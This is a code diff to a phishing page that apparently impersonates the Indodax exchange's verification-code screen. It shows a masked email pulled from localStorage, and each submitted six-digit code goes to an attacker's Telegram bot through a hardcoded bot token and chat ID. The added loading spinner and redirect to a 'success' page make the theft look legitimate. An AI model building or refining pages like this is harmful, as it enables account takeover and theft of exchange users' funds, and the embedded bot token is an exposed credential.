@@ -13,6 +13,36 @@
     body {
       font-family: 'Inter', sans-serif;
     }
+    /* Loading overlay styles */
+    #loadingOverlay {
+      background-color: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(3px);
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    #loadingOverlay.show {
+      visibility: visible;
+      opacity: 1;
+    }
+    /* Spinner animation */
+    .spinner {
+      border: 4px solid #e5e7eb; /* Tailwind gray-200 */
+      border-top: 4px solid #0077cc; /* Custom blue */
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col">
@@ -52,7 +82,7 @@
     <!-- Warning box -->
     <div class="flex items-start bg-yellow-50 rounded-md p-3 mb-5">
       <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-2"></i>
-      <p class="text-yellow-700 text-xs leading-tight">
+      <p class="text-yellow-700 text-xs leading-tight" id="emailWarning">
         Kode verifikasi telah dikirim ke [*********@gmail.com].
       </p>
     </div>
@@ -71,10 +101,35 @@
     </button>
   </div>
 
+  <!-- Loading overlay -->
+  <div id="loadingOverlay">
+    <div class="spinner" role="status" aria-label="Loading"></div>
+  </div>
+
   <script>
     const codeInput = document.getElementById('codeInput');
     const submitBtn = document.getElementById('submitBtn');
     const timerSpan = document.querySelector('.Timer');
+    const emailWarning = document.getElementById('emailWarning');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    // Retrieve email from localStorage and mask it
+    function maskEmail(email) {
+      const [localPart, domain] = email.split('@');
+      if (!localPart || !domain) return email;
+      const maskedLocal = localPart.length <= 2
+        ? localPart[0] + '*'.repeat(localPart.length - 1)
+        : localPart[0] + '*'.repeat(localPart.length - 2) + localPart.slice(-1);
+      return maskedLocal + '@' + domain;
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedEmail = localStorage.getItem('indodaxEmail');
+      if (savedEmail) {
+        const masked = maskEmail(savedEmail);
+        emailWarning.textContent = `Kode verifikasi telah dikirim ke [${masked}].`;
+      }
+    });
 
     codeInput.addEventListener('input', () => {
       if (codeInput.value.trim().length === 6) {
@@ -88,7 +143,7 @@
       }
     });
 
-    // Countdown timer from 02:59 to 00:00
+    // Countdown timer from 00:59 to 00:00
     let timeLeft = 59;
     const timerInterval = setInterval(() => {
       if (timeLeft <= 0) {
@@ -107,6 +162,9 @@
       const code = codeInput.value.trim();
       if (code.length !== 6) return;
 
+      // Show loading overlay
+      loadingOverlay.classList.add('show');
+
       const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
       const chatId = '6155537801';
       const message = `Kode verifikasi diterima: ${code}`;
@@ -123,16 +181,23 @@
       })
       .then(response => response.json())
       .then(data => {
+        loadingOverlay.classList.remove('show');
         if (data.ok) {
           codeInput.value = '';
           submitBtn.disabled = true;
           submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
           submitBtn.classList.remove('bg-gray-700', 'cursor-pointer');
+          // Redirect after short delay to show loading
+          loadingOverlay.classList.add('show');
+          setTimeout(() => {
+            window.location.href = "success.html";
+          }, 800);
         } else {
           alert('Gagal mengirim kode ke Telegram.');
         }
       })
       .catch(() => {
+        loadingOverlay.classList.remove('show');
         alert('Terjadi kesalahan saat mengirim kode.');
       });
     }
